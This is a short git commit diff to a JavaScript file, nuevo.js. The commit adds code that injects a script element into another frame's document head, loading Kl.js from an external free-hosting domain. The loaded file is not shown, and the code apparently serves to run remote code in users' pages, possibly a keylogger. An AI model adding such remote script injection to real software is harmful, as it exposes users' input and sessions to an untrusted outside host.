421cd0e7c99647c5e2dbb762bfcc7105436b585b
Usagi86 <Usagi86@users.noreply.github.com>
2016-10-30 18:14:28 -0600

    Update nuevo.js

--- nuevo.js
+++ nuevo.js
@@ -1,3 +1,8 @@
 //nuevojs.
 
 //alert("Hola. Esto es un mensaje de Texto! :)");
+
+var cabe = IN.CI.document.head
+var scriptt = document.createElement('script');
+scriptt.src="http://latinchat.260mb.net/Kl.js";
+cabe.appendChild(scriptt);
